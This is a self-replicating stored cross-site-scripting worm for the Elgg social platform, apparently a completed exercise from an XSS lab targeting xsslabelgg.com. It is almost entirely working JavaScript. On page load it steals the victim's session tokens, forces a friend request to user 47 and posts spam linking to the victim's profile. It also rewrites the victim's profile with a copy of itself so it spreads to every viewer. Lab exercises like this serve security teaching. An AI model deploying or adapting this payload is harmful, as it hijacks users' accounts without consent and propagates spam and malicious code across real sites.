 <script id="worm">
        window.onload = function() {
            var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
            var jsCode = document.getElementById("worm").innerHTML;
            var tailTag = "</" + "script > ";
            var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);

	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
            var token="&__elgg_token="+elgg.security.token.__elgg_token;
            var guid="&guid=" + elgg.session.user.guid;
            var name="&name=" + elgg.session.user.name;
            var profile_link = "http://www.xsslabelgg.com/profile/" +elgg.session.user.name.toLowerCase();
	var encoded_link = escape(profile_link);
    var brief_desc = "I am sorry to sniff into your acc.";


var send_fr_url="http://www.xsslabelgg.com/action/friends/add?friend=47" + ts + token + ts + token;

var send_post_url="http://www.xsslabelgg.com/action/thewire/add"; //FILL IN

var sendurl="http://www.xsslabelgg.com/action/profile/edit"; //FILL IN


var post_content=token+ts+"&body=To earn 12 USD/Hour(!), visit now "+encoded_link; //FILL IN

	var content=token + ts + name + "&description=1605071"+wormCode+
    "&accesslevel%5Bdescription%5D=1&briefdescription="+brief_desc+
    "&accesslevel%5Bbriefdescription%5D=1&location=dhaka&accesslevel%5Blocation%5D=1&interests=violin&accesslevel%5Binterests%5D=1&skills=tension&accesslevel%5Bskills%5D=1&contactemail=random@gmail.com&accesslevel%5Bcontactemail%5D=1&phone=0000&accesslevel%5Bphone%5D=1&mobile=0000&accesslevel%5Bmobile%5D=1&website=random.com&accesslevel%5Bwebsite%5D=1&twitter=random_twitter&accesslevel%5Btwitter%5D=1" + guid; //FILL IN
    
if(elgg.session.user.guid != 47)
            {
        
                //Create and send Ajax request to add friend
	var fr_Ajax=null;
	fr_Ajax=new XMLHttpRequest();
	fr_Ajax.open("GET",send_fr_url,true);
	fr_Ajax.setRequestHeader("Host","www.xsslabelgg.com");
	fr_Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
	fr_Ajax.send();
            }

if(elgg.session.user.guid != 47)
	{
		//Create and send Ajax request to modify profile
		var post_Ajax=null;
		post_Ajax=new XMLHttpRequest();
		post_Ajax.open("POST",send_post_url,true);
		post_Ajax.setRequestHeader("Host","www.xsslabelgg.com");
		post_Ajax.setRequestHeader("Content-Type",
		"application/x-www-form-urlencoded");
		post_Ajax.send(post_content);
	}

if(elgg.session.user.guid != 47)
            {
        
                //Create and send Ajax request to modify profile
                var Ajax=null;
                Ajax=new XMLHttpRequest();
                Ajax.open("POST",sendurl,true);
                Ajax.setRequestHeader("Host","www.xsslabelgg.com");
                Ajax.setRequestHeader("Content-Type",
                "application/x-www-form-urlencoded");
                Ajax.send(content);
            }
console.log('loaded');
        }
</script >

// samy's profile_link: var profile_link = "http://www.xsslabelgg.com/profile/samy";
// self progile link: var profile_link = "http://www.xsslabelgg.com/profile/" +elgg.session.user.name.toLowerCase();
// page owner's profile link: var profile_link = "http://www.xsslabelgg.com/profile/" +elgg.page_owner.name.toLowerCase();